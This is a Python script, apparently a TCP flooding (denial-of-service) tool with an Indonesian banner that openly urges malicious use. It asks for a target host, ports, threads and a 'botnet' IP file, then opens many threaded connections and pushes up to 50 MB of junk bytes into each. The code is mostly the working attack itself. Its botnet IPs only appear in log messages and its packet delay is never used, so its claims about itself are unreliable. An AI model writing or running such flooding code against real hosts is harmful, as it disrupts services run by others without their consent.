import socket
import threading
import time
import os 
import random
from rich.console import Console
from rich.prompt import Prompt

class TCPFighter:
    def __init__(self, target_host, target_ports, threads, timeout, botnet_ips, packet_delay, max_retries):
        self.target_host = target_host
        self.target_ports = target_ports
        self.threads = threads
        self.timeout = timeout
        self.botnet_ips = botnet_ips
        self.packet_delay = packet_delay
        self.max_retries = max_retries
        self.console = Console()

    def attack_port(self, port, bot_ip):
        data_size_mb = random.randint(1, 50)  
        for _ in range(self.threads):
            retries = 0
            while retries < self.max_retries:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(self.timeout)
                try:
                    s.connect((self.target_host, port))
                    self.display_message(f"Sending attack to {self.target_host}:{port} with size {data_size_mb} MB from {bot_ip}", "green")
                    self.send_traffic(s, bot_ip, data_size_mb)
                    s.close()
                    break
                except Exception as e:
                    self.display_message(f"Failed to connect to port {port} (from {bot_ip}): {e}", "red")
                    retries += 1
                    time.sleep(1)

    def send_traffic(self, s, bot_ip, data_size_mb):
        total_bytes = data_size_mb * 1024 * 1024 
        data = self.generate_random_data(total_bytes)
        s.sendall(data)
        self.display_message(f"Sent {data_size_mb} MB of data from {bot_ip}", "green")

    def generate_random_data(self, size):
        return b"A" * size 

    def start_attack(self):
        threads = []
        for bot_ip in self.botnet_ips:
            port = random.choice(self.target_ports)
            t = threading.Thread(target=self.attack_port, args=(port, bot_ip))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

    def display_message(self, message, color):
        self.console.print(message, style=color)

def main():
    os.system("clear")
    console = Console()
    
    console.print("""
    ███████╗██╗███████╗███████╗██╗  ██╗███████╗██████╗
    ██╔════╝██║██╔════╝██╔════╝╚██╗██╔╝██╔════╝██╔══██╗
    █████╗  ██║███████╗█████╗   ╚███╔╝ █████╗  ██████╔╝
    ██╔══╝  ██║╚════██║██╔══╝   ██╔██╗ ██╔══╝  ██╔══██╗
    ██║     ██║███████║███████╗██╔╝ ██╗███████╗██║  ██║
    ╚═╝     ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
    
    ==========================================================================
    Author : Mr.4Rex_503 Dark Connection
    Version : 999.999
    
    GUNAKAN TOOLS INI SECARA JAHAT DAN JANGAN LUPA NONTON BOKEP SEBELUM MAKE
    TOOLS INI PALSU SECARA PERMANEN
    ==========================================================================
    """, style="bold green")
    target_host = Prompt.ask("Masukkan Target Host mu")
    target_ports = list(map(int, Prompt.ask("Masukkan target Port (80,443,90,98)").split(',')))
    threads = int(Prompt.ask("Masukkan Jumlah threads"))
    botnet_ips_file = Prompt.ask("Masukkan File Botnets mu ")
    packet_delay = float(Prompt.ask("Masukkan penundaan paket mu (dalam hitungan detik)"))
    max_retries = int(Prompt.ask("Masukkan Jumlah Maksimum nya"))

    with open(botnet_ips_file, 'r') as f:
        botnet_ips = [line.strip() for line in f.readlines()]

    console.print(f"\nMenyerang ke {target_host} dengan port {', '.join(map(str, target_ports))} dengan {threads} threads.\n", style=" green")
    
    tcp_fighter = TCPFighter(target_host, target_ports, threads, 5, botnet_ips, packet_delay, max_retries)
    tcp_fighter.start_attack()

if __name__ == "__main__":
    main()